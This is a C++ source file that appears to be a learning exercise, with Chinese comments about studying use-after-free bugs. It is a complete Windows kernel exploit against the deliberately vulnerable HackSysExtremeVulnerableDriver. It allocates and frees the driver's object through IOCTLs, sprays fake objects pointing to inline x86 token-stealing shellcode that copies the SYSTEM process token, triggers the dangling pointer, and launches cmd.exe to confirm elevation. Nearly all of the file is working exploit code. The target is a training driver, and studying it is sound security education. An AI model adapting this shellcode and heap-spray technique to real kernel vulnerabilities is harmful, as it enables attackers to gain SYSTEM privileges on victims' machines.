#include <iostream>
#include <Windows.h>

void ShellCode()
{
	_asm 
	{
		nop
		nop
		nop
		nop
		pushad
		mov eax,fs:[124h]
		mov eax, [eax + 0x50]
		mov ecx, eax
		mov edx, 4
	find_sys_pid:
		mov eax, [eax + 0xb8]
		sub eax, 0xb8
		cmp [eax + 0xb4], edx
		jnz find_sys_pid
		mov edx, [eax + 0xf8]
		mov [ecx + 0xf8], edx
		popad
		ret
	}
}

typedef void(*FunctionPointer) ();

typedef struct _FAKEUSEAFTERFREE
{
	FunctionPointer countinter;
	char bufffer[0x54];
}FAKEUSEAFTERFREE, *PUSEAFTERFREE;

static
VOID xxCreateCmdLineProcess(VOID)
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main()
{
	std::cout << "****************************" << std::endl;
	std::cout << "[+] UAF 漏洞学习" << std::endl;
	std::cout << "[+] UAF利用通用套路" << std::endl;
	std::cout << "[+] 创建pool对象" << std::endl;
	std::cout << "[+] 触发USE AFTER FREE 逻辑" << std::endl;
	std::cout << "[+] 覆盖POOL对象" << std::endl;
	std::cout << "[+] pwn" << std::endl;
	std::cout << "****************************" << std::endl;

	std::cout << "[+] 创建Pool对象" << std::endl;

	DWORD recvBuf ;
	// 获取句柄
	HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, NULL, 0x3, 0, NULL);

	if (hDevice == NULL || hDevice == HANDLE(-1))
	{
		std::cout << "[+] 获取驱动句柄失败" << std::endl;
		return 0;
	}

	// 创建对象
	// 调用 AllocateUaFObject对象
	//__debugbreak();
	DeviceIoControl(hDevice, 0x222013, NULL, NULL,NULL, 0, &recvBuf, NULL);

	std::cout << "[+] 触发UAF逻辑" << std::endl;
	// 调用FreeUaFObject
	// 释放对象
	DeviceIoControl(hDevice, 0x22201B, NULL, NULL, NULL, 0, &recvBuf, NULL);
	//__debugbreak();
	
	std::cout << "[+] 覆盖POOL对象, heap spray" << std::endl;
	
	// ok, 接下来是如何覆盖
	std::cout << "[+] pwn" << std::endl;
	// 伪造pwn过程
	// 调用USEUafObject
	
	// 先编写ShellCode

	PUSEAFTERFREE fakeG_UseAfterFree = (PUSEAFTERFREE)malloc(sizeof(FAKEUSEAFTERFREE));
	fakeG_UseAfterFree->countinter = ShellCode;
	RtlFillMemory(fakeG_UseAfterFree->bufffer, sizeof(fakeG_UseAfterFree->bufffer), 'A');
	
	// 喷射
	//__debugbreak();
	for (int i = 0; i < 5000; i++)
	{
		DeviceIoControl(hDevice, 0x22201F, fakeG_UseAfterFree, 0x60, NULL, 0, &recvBuf, NULL);
	}

	std::cout << "[+] Fakse pointer" << fakeG_UseAfterFree << std::endl;
	std::cout << "[+] Trigger BSOD" << std::endl;
	//__debugbreak();
	DeviceIoControl(hDevice, 0x222017, NULL, NULL, NULL, 0, &recvBuf, NULL);
	std::cout << "call a cmd for confirm " << std::endl;
	xxCreateCmdLineProcess();
	return 0;
}

